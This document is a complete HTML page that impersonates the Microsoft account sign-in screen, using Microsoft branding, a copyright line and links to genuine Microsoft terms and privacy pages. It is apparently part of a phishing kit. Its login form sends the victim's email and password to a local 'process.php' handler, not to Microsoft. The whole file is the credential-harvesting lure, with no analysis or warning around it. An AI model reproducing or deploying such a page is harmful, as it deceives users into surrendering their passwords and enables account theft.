<!DOCTYPE HTML>
<html>
<head><title>Sign in to your Microsoft account</title>
<link href="https://netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<link href="resources/css/styles.css" rel="stylesheet" id="main-css">
<link rel="icon" type="image/ico" href="resources/img/msft.ico"/>
<script src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script src="https://netdna.bootstrapcdn.com/bootstrap/3.0.0/js/bootstrap.min.js"></script>
</head>
<body>
	<div class="container">
    <div class="row">
        <div>
            <div class="account-wall">
                <div class="logo">
                <img class="profile-img" src="resources/img/microsoft_logo.png" alt=""></div>
                <div class="loginHeader">Sign in</div>
                <form class="form-signin" method="post" action="process.php">
                <input type="email" class="form-control" name="email" placeholder="Email, phone, or Skype" required autofocus>
                <input type="password" name="pass" class="form-control" placeholder="Password" required>
                <button class="btn btn-primary btn-block" name="login" type="submit">
                    Sign in</button>
                <label class="account">
                    No account? <a href="#" class="need-help">Create one!</a><span class="clearfix"></span>
                </label>
                
                </form>
            </div>
        </div>
        
    </div>
</div>
<div class="footer">
            <div id="footerLinks" class="footerNode text-secondary">
                <span id="ftrCopy">&copy;2017 Microsoft</span> 
                <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-IN&amp;vv=1600">Terms of use</a> 
                <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-IN&amp;vv=1600">Privacy &amp; cookies</a> 
            </div>
        </div>
</body>
</html>
